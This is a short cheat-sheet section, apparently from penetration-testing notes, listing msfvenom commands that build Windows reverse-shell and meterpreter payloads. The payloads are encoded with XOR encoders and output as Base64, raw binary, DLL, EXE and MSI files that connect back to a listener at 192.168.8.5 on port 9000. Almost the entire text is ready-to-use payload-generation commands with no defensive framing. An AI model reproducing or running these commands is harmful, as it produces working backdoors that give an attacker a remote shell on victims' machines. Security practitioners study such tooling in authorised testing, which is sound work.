### Generate a Reverse Shell Payload for Windows OS

To generate a `Base64 encoded payload`, use one of the following MSFvenom commands (modify them to your need):

```fundamental

msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw -b \x00\x0a\x0d\xff | base64 -w 0 > payload.txt

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw -b \x00\x0a\x0d\xff | base64 -w 0 > payload.txt

msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/meterpreter_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw | base64 -w 0 > payload.txt

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw | base64 -w 0 > payload.txt

```

To generate a `binary file`, use one of the following MSFvenom commands (modify them to your need):

```fundamental

msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw -b \x00\x0a\x0d\xff -o payload.bin

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw -b \x00\x0a\x0d\xff -o payload.bin

msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/meterpreter_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw -o payload.bin

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw -o payload.bin

```

To generate a `DLL file`, use one of the following MSFvenom commands (modify them to your need):

```fundamental

msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f dll -b \x00\x0a\x0d\xff -o payload.dll

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f dll -b \x00\x0a\x0d\xff -o payload.dll

```

To generate a `standalone executable`, file use one of the following MSFvenom commands (modify them to your need):

```fundamental

msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f exe -b \x00\x0a\x0d\xff -o payload.exe

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f exe -b \x00\x0a\x0d\xff -o payload.exe

msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/meterpreter_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f exe -o payload.exe

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f exe -o payload.exe

```

To generate an `MSI file`, use one of the following MSFvenom commands (modify them to your need):

```fundamental

msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f msi -b \x00\x0a\x0d\xff -o payload.msi

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f msi -b \x00\x0a\x0d\xff -o payload.msi

```

Bytecode might not work on the first try due to some other bad characters. Trial and error is the key.

So far there is no easy way to generate a DLL nor MSI file with a stageless meterpreter shell due to the size issues.